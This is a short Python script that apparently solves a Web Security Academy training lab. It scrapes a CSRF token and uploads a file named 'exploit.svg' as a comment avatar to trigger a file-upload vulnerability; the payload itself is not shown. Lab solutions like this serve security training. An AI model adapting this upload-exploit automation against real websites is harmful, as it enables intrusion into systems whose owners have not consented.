from bs4 import BeautifulSoup
import requests

s = requests.Session()

site = 'acec1f041ebdcc0ec03f37c000df00a7.web-security-academy.net'
file = open('./exploit.svg', 'rb')

post_url = f'https://{site}/post?postId=1'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'

multipart_form_data = {
    'csrf': (None, csrf),
    'postId': (None, '1'),
    'comment': (None, 'Nice blog.  Be a shame if anything happened to it.'),
    'name': (None, 'Wu'),
    'email': (None, 'wuchang@pdx.edu'),
    'website': (None, 'https://pdx.edu'),
    'avatar': ('avatar.svg', file)
}

resp = s.post(comment_url, files=multipart_form_data)
